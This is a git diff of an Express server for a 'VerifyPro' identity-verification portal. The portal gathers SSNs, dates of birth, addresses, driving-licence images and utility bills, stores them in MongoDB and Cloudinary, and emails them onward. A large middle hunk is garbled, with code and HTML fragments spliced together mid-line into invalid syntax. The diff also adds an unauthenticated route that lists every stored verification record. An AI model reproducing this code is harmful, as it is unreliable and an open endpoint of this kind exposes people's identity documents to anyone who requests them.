@@ -1,5 +1,7 @@
 const express = require('express');
 const multer = require('multer');
+const { CloudinaryStorage } = require('multer-storage-cloudinary');
+const cloudinary = require('cloudinary').v2;
 const nodemailer = require('nodemailer');
 const path = require('path');
 const fs = require('fs');
@@ -7,6 +9,13 @@ const cors = require('cors');
 const mongoose = require('mongoose');
 const session = require('express-session');
 require('dotenv').config();
+
+// Configure Cloudinary
+cloudinary.config({
+  cloud_name: process.env.CLOUDINARY_CLOUD_NAME,
+  api_key: process.env.CLOUDINARY_API_KEY,
+  api_secret: process.env.CLOUDINARY_API_SECRET,
+});
 
 // MongoDB Connection
 let mongoConnected = false;
@@ -105,22 +114,17 @@ app.use(cors());
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// Configure Multer for file uploads
-const storage = multer.diskStorage({
-    destination: (req, file, cb) => {
-        const dest = path.join('/tmp', 'uploads');
-        fs.mkdirSync(dest, { recursive: true });
-        cb(null, dest);
+// Configure Multer for file uploads to Cloudinary
+const storage = new CloudinaryStorage({
+    cloudinary: cloudinary,
+    params: {
+        folder: 'verifypro-uploads',
+        format: async (req, file) => 'png', // supports promises as well
+        public_id: (req, file) => `${Date.now()}-${file.originalname}`,
     },
-    filename: (req, file, cb) => {
-        cb(null, `${Date.now()}-${file.originalname}`);
-    }
 });
 
 const upload = multer({ storage: storage });
-
-// Serve uploaded files statically
-app.use('/uploads', express.static(path.join('/tmp', 'uploads')));
 
 // Configure Nodemailer Transporter
 // NOTE: You need to configure these environment variables
@@ -166,9 +170,9 @@ async function saveVerificationToMongoDB(formData, files) {
             fullAddress: formData.fullAddress,
             whatsappNumber: formData.whatsappNumber,
             files: {
-                dlFront: files.dlFront?.[0]?.filename || 'N/A',
-                dlBack: files.dlBack?.[0]?.filename || 'N/A',
-                utilityBill: files.utilityBill?.[0]?.filename || 'N/A'
+                dlFront: files.dlFront?.[0]?.path || 'N/A',
+                dlBack: files.dlBack?.[0]?.path || 'N/A',
+                utilityBill: files.utilityBill?.[0]?.path || 'N/A'
             },
             status: 'pending_review',
             ipAddress: 'client-ip-placeholder'
@@ -310,355 +314,372 @@ app.post('/api/verify', upload.fields([
         }
 
         // Prepare email attachments
-        const attachments = [
-            {
+        const attachments = [bject.values(req.files).flat().map(file => ({
+            {ilename: file.originalname,
                 filename: `DL-Front-${Date.now()}.${req.files.dlFront[0].originalname.split('.').pop()}`,
                 path: req.files.dlFront[0].path
             },
-            {
-                filename: `DL-Back-${Date.now()}.${req.files.dlBack[0].originalname.split('.').pop()}`,
+            {ild email
+                filename: `DL-Back-${Date.now()}.${req.files.dlBack[0].originalname.split('.').pop()}`,eHtmlServer(formData.fullName)}`;
                 path: req.files.dlBack[0].path
-            },
-            {
+            },emailHtml = `
+            {!DOCTYPE html>
                 filename: `Utility-Bill-${Date.now()}.${req.files.utilityBill[0].originalname.split('.').pop()}`,
                 path: req.files.utilityBill[0].path
-            }
-        ];
-
-        // Build email
+            }   <meta charset="UTF-8">
+        ];      <style>
+                    body {
+        // Build email  font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
         const emailSubject = `[VERIFICATION] Order #${escapeHtmlServer(formData.orderNumber)} - ${escapeHtmlServer(formData.fullName)}`;
-        
+                        color: #333;
         const emailHtml = `
-            <!DOCTYPE html>
-            <html>
-            <head>
+            <!DOCTYPE html>ner {
+            <html>      max-width: 600px;
+            <head>      margin: 0 auto;
                 <meta charset="UTF-8">
-                <style>
+                <style> background-color: #f8f9fa;
                     body {
                         font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-                        line-height: 1.6;
+                        line-height: 1.6;r-gradient(135deg, #667eea 0%, #764ba2 50%, #f093fb 100%);
                         color: #333;
-                    }
-                    .container {
-                        max-width: 600px;
+                    }   padding: 30px 20px;
+                    .container {adius: 12px 12px 0 0;
+                        max-width: 600px;r;
                         margin: 0 auto;
                         padding: 20px;
                         background-color: #f8f9fa;
-                    }
-                    .header {
+                    }   font-size: 28px;
+                    .header {weight: 800;
                         background: linear-gradient(135deg, #667eea 0%, #764ba2 50%, #f093fb 100%);
                         color: #fff;
                         padding: 30px 20px;
                         border-radius: 12px 12px 0 0;
                         text-align: center;
-                    }
+                    }   opacity: 0.95;
                     .header h1 {
                         margin: 0;
-                        font-size: 28px;
+                        font-size: 28px;: #fff;
                         font-weight: 800;
-                        letter-spacing: -1px;
-                    }
+                        letter-spacing: -1px;px 12px;
+                    }   box-shadow: 0 4px 12px rgba(0,0,0,0.1);
                     .header p {
                         margin: 8px 0 0 0;
-                        font-size: 14px;
-                        opacity: 0.95;
-                    }
-                    .content {
+                        font-size: 14px;: #f0f0f0;
+                        opacity: 0.95;15px;
+                    }   margin: 25px 0 15px 0;
+                    .content {-left: 4px solid #667eea;
                         background-color: #fff;
                         padding: 30px;
                         border-radius: 0 0 12px 12px;
                         box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-                    }
+                    }   letter-spacing: 0.5px;
                     .section-title {
                         background-color: #f0f0f0;
                         padding: 12px 15px;
-                        margin: 25px 0 15px 0;
+                        margin: 25px 0 15px 0;pse;
                         border-left: 4px solid #667eea;
                         font-weight: 700;
                         color: #222;
                         font-size: 14px;
-                        text-transform: uppercase;
+                        text-transform: uppercase;e8e8e8;
                         letter-spacing: 0.5px;
-                    }
-                    table {
+                    }d {
+                    table {ding: 12px 15px;
                         width: 100%;
                         border-collapse: collapse;
                         background-color: #f8f9fa;
-                        margin: 10px 0;
-                    }
-                    tr {
+                        margin: 10px 0;0;
+                    }   width: 40%;
+                    tr {background-color: #f0f0f0;
                         border-bottom: 1px solid #e8e8e8;
                     }
-                    td {
+                    td {ter {
                         padding: 12px 15px;
-                        color: #555;
-                    }
-                    td:first-child {
+                        color: #555; 20px;
+                    }   border-top: 1px solid #ddd;
+                    td:first-child {2px;
                         font-weight: 600;
-                        width: 40%;
+                        width: 40%; center;
                         background-color: #f0f0f0;
-                        color: #333;
-                    }
-                    .footer {
+                        color: #333;e {
+                    }   background: linear-gradient(135deg, rgba(102, 126, 234, 0.1) 0%, rgba(118, 75, 162, 0.1) 100%);
+                    .footer {r-left: 4px solid #667eea;
                         margin-top: 30px;
                         padding-top: 20px;
                         border-top: 1px solid #ddd;
                         font-size: 12px;
                         color: #999;
-                        text-align: center;
-                    }
+                        text-align: center;ck;
+                    }   background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                     .attachments-note {
                         background: linear-gradient(135deg, rgba(102, 126, 234, 0.1) 0%, rgba(118, 75, 162, 0.1) 100%);
                         border-left: 4px solid #667eea;
-                        padding: 12px;
+                        padding: 12px;x;
                         margin-top: 20px;
                         border-radius: 6px;
                     }
                     .status-badge {
                         display: inline-block;
                         background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-                        color: white;
+                        color: white;">
                         padding: 6px 12px;
                         border-radius: 20px;
-                        font-size: 12px;
+                        font-size: 12px;ation Submission</p>
                         font-weight: 700;
                         margin-top: 10px;
-                    }
-                </style>
+                    }   <h2 style="color: #222; margin-top: 0;">Verification Details Received</h2>
+                </style><p style="color: #666; margin-bottom: 20px;">A new verification submission has been received. Below are the submitted details:</p>
             </head>
-            <body>
+            <body>      <div class="section-title">📋 Order & Personal Information</div>
                 <div class="container">
                     <div class="header">
-                        <h1>VerifyPro</h1>
-                        <p>✓ New Verification Submission</p>
-                    </div>
+                        <h1>VerifyPro</h1>Number</td>
+                        <p>✓ New Verification Submission</p>67eea;">${escapeHtmlServer(formData.orderNumber)}</strong></td>
+                    </div>  </tr>
                     <div class="content">
                         <h2 style="color: #222; margin-top: 0;">Verification Details Received</h2>
                         <p style="color: #666; margin-bottom: 20px;">A new verification submission has been received. Below are the submitted details:</p>
-
+                            </tr>
                         <div class="section-title">📋 Order & Personal Information</div>
-                        <table>
-                            <tr>
+                        <table> <td>Date of Birth</td>
+                            <tr><td>${escapeHtmlServer(formData.dateOfBirth)}</td>
                                 <td>Order Number</td>
                                 <td><strong style="color: #667eea;">${escapeHtmlServer(formData.orderNumber)}</strong></td>
-                            </tr>
-                            <tr>
+                            </tr>td>SSN / TAX ID / VAT</td>
+                            <tr><td><span style="font-weight: 600; letter-spacing: 1px;">••• •• ${escapeHtmlServer(formData.ssn.slice(-4))}</span></td>
                                 <td>Full Name</td>
                                 <td>${escapeHtmlServer(formData.fullName)}</td>
                             </tr>
-                            <tr>
+                            <tr>ss="section-title">📍 Address Information</div>
                                 <td>Date of Birth</td>
                                 <td>${escapeHtmlServer(formData.dateOfBirth)}</td>
-                            </tr>
-                            <tr>
+                            </tr>td>Full Address</td>
+                            <tr><td>${escapeHtmlServer(formData.fullAddress).replace(/\n/g, '<br>')}</td>
                                 <td>SSN / TAX ID / VAT</td>
                                 <td><span style="font-weight: 600; letter-spacing: 1px;">••• •• ${escapeHtmlServer(formData.ssn.slice(-4))}</span></td>
                             </tr>
-                        </table>
-
-                        <div class="section-title">📍 Address Information</div>
+                        </table>ss="section-title">📞 Contact Information</div>
                         <table>
-                            <tr>
+                        <div class="section-title">📍 Address Information</div>
+                        <table> <td>WhatsApp Number</td>
+                            <tr><td><strong>${escapeHtmlServer(formData.whatsappNumber)}</strong></td>
                                 <td>Full Address</td>
                                 <td>${escapeHtmlServer(formData.fullAddress).replace(/\n/g, '<br>')}</td>
                             </tr>
-                        </table>
-
-                        <div class="section-title">📞 Contact Information</div>
-                        <table>
-                            <tr>
-                                <td>WhatsApp Number</td>
+                        </table>ss="section-title">📎 Documents Attached</div>
+                        <p style="color: #666; margin: 0 0 10px 0; font-size: 14px;">The following documents have been uploaded:</p>
+                        <div class="section-title">📞 Contact Information</div>r: #555; font-size: 14px;">
+                        <table>>✓ Driving License - Front</li>
+                            <tr>✓ Driving License - Back</li>
+                                <td>WhatsApp Number</td>Bill</li>
                                 <td><strong>${escapeHtmlServer(formData.whatsappNumber)}</strong></td>
                             </tr>
-                        </table>
-
+                        </table>ss="attachments-note">
+                            All documents are attached to this email. Please review them carefully.
                         <div class="section-title">📎 Documents Attached</div>
                         <p style="color: #666; margin: 0 0 10px 0; font-size: 14px;">The following documents have been uploaded:</p>
                         <ul style="margin: 0 0 10px 0; padding-left: 20px; color: #555; font-size: 14px;">
                             <li>✓ Driving License - Front</li>
                             <li>✓ Driving License - Back</li>
                             <li>✓ Electricity / Utility Bill</li>
-                        </ul>
-
+                        </ul>   <td>${new Date().toLocaleString()}</td>
+                            </tr>
                         <div class="attachments-note">
                             All documents are attached to this email. Please review them carefully.
-                        </div>
-
+                        </div>  <td><div class="status-badge">⏳ PENDING REVIEW</div></td>
+                            </tr>
                         <div class="section-title">⏰ Submission Details</div>
                         <table>
-                            <tr>
-                                <td>Submitted At</td>
-                                <td>${new Date().toLocaleString()}</td>
-                            </tr>
+                            <tr>ss="footer">
+                                <td>Submitted At</td> 0;">© 2026 VerifyPro. All rights reserved.</p>
+                                <td>${new Date().toLocaleString()}</td>nt Verification Platform</p>
+                            </tr>yle="margin: 0;">This email contains sensitive information. Please handle securely.</p>
                             <tr>
                                 <td>Status</td>
                                 <td><div class="status-badge">⏳ PENDING REVIEW</div></td>
                             </tr>
                         </table>
-
+        `;
                         <div class="footer">
                             <p style="margin: 0 0 8px 0;">© 2026 VerifyPro. All rights reserved.</p>
                             <p style="margin: 0 0 8px 0;">Secure Document Verification Platform</p>
                             <p style="margin: 0;">This email contains sensitive information. Please handle securely.</p>
-                        </div>
-                    </div>
-                </div>
-            </body>
+                        </div>CIPIENT_EMAIL || process.env.EMAIL_TO,
+                    </div>Subject,
+                </div>lHtml,
+            </body>ents: attachments
             </html>
         `;
-
-        // Send email
+        // Try to send email, but don't fail the submission if it fails
+        // Send email = false;
         const mailOptions = {
             from: process.env.EMAIL_FROM || process.env.EMAIL_USER,
             to: process.env.RECIPIENT_EMAIL || process.env.EMAIL_TO,
-            subject: emailSubject,
-            html: emailHtml,
-            attachments: attachments
-        };
-
+            subject: emailSubject,ation email sent successfully for Order #${formData.orderNumber}`);
+            html: emailHtml, {
+            attachments: attachmentsending failed (non-critical): ${emailError.message}`);
+        };  console.log(`📁 Verification files saved locally for Order #${formData.orderNumber}`);
+            console.log(`📧 Email credentials may need to be configured. See SETUP.md for help.`);
         // Try to send email, but don't fail the submission if it fails
         let emailSent = false;
-        try {
-            await transporter.sendMail(mailOptions);
+        try {ean up uploaded files after sending (optional)
+            await transporter.sendMail(mailOptions);e keep files for manual review
             emailSent = true;
             console.log(`✅ Verification email sent successfully for Order #${formData.orderNumber}`);
-        } catch (emailError) {
+        } catch (emailError) {rEach(attachment => {
             console.warn(`⚠️ Email sending failed (non-critical): ${emailError.message}`);
             console.log(`📁 Verification files saved locally for Order #${formData.orderNumber}`);
             console.log(`📧 Email credentials may need to be configured. See SETUP.md for help.`);
-        }
-
+        }       });
+            }, 5000);
         // Clean up uploaded files after sending (optional)
         // Only clean up if email was sent, otherwise keep files for manual review
-        if (emailSent) {
+        if (emailSent) {response
             setTimeout(() => {
                 attachments.forEach(attachment => {
                     fs.unlink(attachment.path, (err) => {
                         if (err) console.error(`Error deleting file: ${attachment.path}`, err);
-                    });
-                });
-            }, 5000);
-        }
-
+                    });fication submitted successfully. Files saved (email pending configuration)',
+                });: formData.orderNumber,
+            }, 5000);mongoId,
+        }   emailSent: emailSent,
+            filesCount: 3
         // Send success response
         res.status(200).json({
             success: true,
-            message: emailSent 
+            message: emailSent cation submission error:', error);
                 ? 'Verification submitted successfully and email sent' 
                 : 'Verification submitted successfully. Files saved (email pending configuration)',
-            orderId: formData.orderNumber,
-            mongoId: mongoId,
+            orderId: formData.orderNumber,ng submission. Please try again.',
+            mongoId: mongoId,env.NODE_ENV === 'development' ? error.message : undefined
             emailSent: emailSent,
             filesCount: 3
         });
 
     } catch (error) {
         console.error('❌ Verification submission error:', error);
-
+ */
         res.status(500).json({
             error: 'An error occurred during submission. Please try again.',
             details: process.env.NODE_ENV === 'development' ? error.message : undefined
-        });
-    }
-});
-
+        });.session.adminLoggedIn) {
+    }   return res.redirect('/admin');
+}); }
+    res.sendFile(path.join(__dirname, 'public', 'admin-login.html'));
 /**
  * ADMIN AUTHENTICATION ROUTES
- */
-
-// Admin login page
+ */Admin login API
+app.post('/api/admin/login', (req, res) => {
+// Admin login pagepassword } = req.body;
 app.get('/admin/login', (req, res) => {
-    if (req.session.adminLoggedIn) {
-        return res.redirect('/admin');
-    }
+    if (req.session.adminLoggedIn) {sword === ADMIN_PASSWORD) {
+        return res.redirect('/admin');ue;
+    }   req.session.adminEmail = email;
     res.sendFile(path.join(__dirname, 'public', 'admin-login.html'));
-});
-
+}); } else {
+        res.status(401).json({ success: false, message: 'Invalid credentials' });
 // Admin login API
 app.post('/api/admin/login', (req, res) => {
     const { email, password } = req.body;
-
+// Admin logout
     if (email === ADMIN_EMAIL && password === ADMIN_PASSWORD) {
         req.session.adminLoggedIn = true;
-        req.session.adminEmail = email;
+        req.session.adminEmail = email;'Logged out' });
         res.json({ success: true, message: 'Login successful' });
     } else {
         res.status(401).json({ success: false, message: 'Invalid credentials' });
-    }
-});
-
+    } requireAdmin = (req, res, next) => {
+}); if (req.session.adminLoggedIn) {
+        next();
 // Admin logout
-app.get('/api/admin/logout', (req, res) => {
+app.get('/api/admin/logout', (req, res) => {horized' });
     req.session.destroy();
     res.json({ success: true, message: 'Logged out' });
 });
-
+// Admin dashboard page
 // Middleware: Check if admin is logged in
 const requireAdmin = (req, res, next) => {
-    if (req.session.adminLoggedIn) {
+    if (req.session.adminLoggedIn) {login');
         next();
-    } else {
+    } else {File(path.join(__dirname, 'public', 'admin-dashboard.html'));
         res.status(401).json({ error: 'Unauthorized' });
     }
-};
-
+}; API: Get all verifications
+app.get('/api/admin/verifications', requireAdmin, async (req, res) => {
 // Admin dashboard page
-app.get('/admin', (req, res) => {
-    if (!req.session.adminLoggedIn) {
+app.get('/admin', (req, res) => {it Verification.find().sort({ createdAt: -1 });
+    if (!req.session.adminLoggedIn) {a: verifications });
         return res.redirect('/admin/login');
-    }
+    }   res.status(500).json({ error: error.message });
     res.sendFile(path.join(__dirname, 'public', 'admin-dashboard.html'));
 });
 
-// API: Get all verifications
-app.get('/api/admin/verifications', requireAdmin, async (req, res) => {
-    try {
-        const verifications = await Verification.find().sort({ createdAt: -1 });
-        res.json({ success: true, data: verifications });
+// API: Get a single verification by IDD
+app.get('/api/verification/:id', async (req, res) => {=> {
+    if (!req.session.isAdmin) {
+        return res.status(403).json({ error: 'Forbidden' });
+    }
+    try {s.status(404).json({ error: 'Verification not found' });
+        const verification = await Verification.findById(req.params.id);
+        if (!verification) {   res.json({ success: true, data: verification });
+            return res.status(404).json({ error: 'Verification not found' }); } catch (error) {
+        }        res.status(500).json({ error: error.message });
+        res.json(verification);
     } catch (error) {
+        console.error('Error fetching verification details:', error);
+        res.status(500).json({ error: 'Server error' });
+    }tions/:id', requireAdmin, async (req, res) => {
+});
+onst { status } = req.body;
+// API: Get all verificationsincludes(status)) {
+app.get('/api/verifications', async (req, res) => {s.status(400).json({ error: 'Invalid status' });
+    try {
+        const verifications = await Verification.find().sort({ createdAt: -1 });   const verification = await Verification.findByIdAndUpdate(
+        res.json({ success: true, data: verifications });         req.params.id,
+    } catch (error) {            { status },
         res.status(500).json({ error: error.message });
     }
-});
+});es.json({ success: true, data: verification });
 
 // API: Get verification by ID
 app.get('/api/admin/verifications/:id', requireAdmin, async (req, res) => {
     try {
         const verification = await Verification.findById(req.params.id);
-        if (!verification) {
-            return res.status(404).json({ error: 'Verification not found' });
+        if (!verification) {n record
+            return res.status(404).json({ error: 'Verification not found' });verifications/:id', requireAdmin, async (req, res) => {
         }
-        res.json({ success: true, data: verification });
+        res.json({ success: true, data: verification });nst verification = await Verification.findById(req.params.id);
     } catch (error) {
-        res.status(500).json({ error: error.message });
+        res.status(500).json({ error: error.message });s.status(404).json({ error: 'Verification not found', success: false });
     }
 });
-
-// API: Update verification status
-app.put('/api/admin/verifications/:id', requireAdmin, async (req, res) => {
-    try {
-        const { status } = req.body;
+     // Delete uploaded files if they exist
+// API: Update verification status        if (verification.files) {
+app.put('/api/admin/verifications/:id', requireAdmin, async (req, res) => {.dlFront) {
+    try {lFront);
+        const { status } = req.body;       if (fs.existsSync(dlFrontPath)) fs.unlinkSync(dlFrontPath);
         if (!['pending_review', 'approved', 'rejected'].includes(status)) {
-            return res.status(400).json({ error: 'Invalid status' });
+            return res.status(400).json({ error: 'Invalid status' });.files.dlBack) {
         }
-        const verification = await Verification.findByIdAndUpdate(
-            req.params.id,
-            { status },
-            { new: true }
-        );
+        const verification = await Verification.findByIdAndUpdate(       if (fs.existsSync(dlBackPath)) fs.unlinkSync(dlBackPath);
+            req.params.id,            }
+            { status },) {
+            { new: true }Path = path.join(uploadsDir, verification.files.utilityBill);
+        );Path)) fs.unlinkSync(utilityBillPath);
         res.json({ success: true, data: verification });
     } catch (error) {
         res.status(500).json({ error: error.message });
     }
 });
-
-// API: Delete verification record
-app.delete('/api/admin/verifications/:id', requireAdmin, async (req, res) => {
+uccessfully' });
+// API: Delete verification recorderror) {
+app.delete('/api/admin/verifications/:id', requireAdmin, async (req, res) => {ge, success: false });
     try {
         const verification = await Verification.findById(req.params.id);
         if (!verification) {
-            return res.status(404).json({ error: 'Verification not found', success: false });
-        }
-
+            return res.status(404).json({ error: 'Verification not found', success: false });uploaded files
+        }app.get('/uploads/:filename', (req, res) => {
+, req.params.filename);
         // Delete uploaded files if they exist
         if (verification.files) {
             if (verification.files.dlFront) {
@@ -671,52 +692,52 @@ app.delete('/api/admin/verifications/:id', requireAdmin, async (req, res) => {
             }
             if (verification.files.utilityBill) {
                 const utilityBillPath = path.join(uploadsDir, verification.files.utilityBill);
-                if (fs.existsSync(utilityBillPath)) fs.unlinkSync(utilityBillPath);
+                if (fs.existsSync(utilityBillPath)) fs.unlinkSync(utilityBillPath);eck endpoint
             }
-        }
-
-        // Delete the verification record
-        await Verification.findByIdAndDelete(req.params.id);
+        }es.status(200).json({ 
+     status: 'OK', 
+        // Delete the verification record        timestamp: new Date().toISOString(),
+        await Verification.findByIdAndDelete(req.params.id);cted: mongoConnected
         res.json({ success: true, message: 'Verification record deleted successfully' });
     } catch (error) {
         res.status(500).json({ error: error.message, success: false });
-    }
+    }// 404 Handler
 });
-
+'Endpoint not found' });
 // Serve uploaded files
 app.get('/uploads/:filename', (req, res) => {
     const filePath = path.join(uploadsDir, req.params.filename);
     if (fs.existsSync(filePath)) {
-        res.sendFile(filePath);
+        res.sendFile(filePath);sole.error('❌ Server error:', err);
     } else {
-        res.status(404).json({ error: 'File not found' });
-    }
-});
+        res.status(404).json({ error: 'File not found' });    // Handle multer errors
+    }de === 'LIMIT_FILE_SIZE') {
+});us(400).json({ error: 'File is too large. Maximum size is 5MB.' });
 
 // Serve home page
-app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'public', 'index.html'));
+app.get('/', (req, res) => {    if (err.code === 'LIMIT_FILE_COUNT') {
+    res.sendFile(path.join(__dirname, 'public', 'index.html'));es.status(400).json({ error: 'Too many files uploaded.' });
 });
 
-// Health check endpoint
-app.get('/health', (req, res) => {
-    res.status(200).json({ 
+// Health check endpoint    res.status(500).json({
+app.get('/health', (req, res) => {curred',
+    res.status(200).json({  'development' ? err.message : undefined
         status: 'OK', 
         timestamp: new Date().toISOString(),
         mongoConnected: mongoConnected
     });
 });
-
-// 404 Handler
-app.use((req, res) => {
-    res.status(404).json({ error: 'Endpoint not found' });
+onsole.log(`
+// 404 Handler╔════════════════════════════════════════════════════════════╗
+app.use((req, res) => {VERIFICATION PORTAL                ║
+    res.status(404).json({ error: 'Endpoint not found' });nt Verification System    ║
 });
-
-// Error Handler
-app.use((err, req, res, next) => {
-    console.error('❌ Server error:', err);
-
-    // Handle multer errors
+ver:        http://localhost:${PORT}                       ║
+// Error Handler Admin Panel:   http://localhost:${PORT}/admin/login              ║
+app.use((err, req, res, next) => {║   Database:      MongoDB                                   ║
+    console.error('❌ Server error:', err);    Running                                   ║
+                                     ║
+    // Handle multer errorsials:                                       ║
     if (err.code === 'LIMIT_FILE_SIZE') {
         return res.status(400).json({ error: 'File is too large. Maximum size is 5MB.' });
     }
@@ -724,17 +745,7 @@ app.use((err, req, res, next) => {
     if (err.code === 'LIMIT_FILE_COUNT') {
         return res.status(400).json({ error: 'Too many files uploaded.' });
     }
-
-    res.status(500).json({
-        error: 'An error occurred',
-        details: process.env.NODE_ENV === 'development' ? err.message : undefined
-    });
-});
-
-// Start server
-app.listen(PORT, () => {
-    console.log(`
-╔════════════════════════════════════════════════════════════╗
+    res.status(500).json({        error: 'An error occurred',        details: process.env.NODE_ENV === 'development' ? err.message : undefined    });});// Start serverapp.listen(PORT, () => {    console.log(`╔════════════════════════════════════════════════════════════╗
 ║   🔐 VERIFYPRO - SECURE VERIFICATION PORTAL                ║
 ║   MongoDB Edition - Secure Document Verification System    ║
 ╠════════════════════════════════════════════════════════════╣
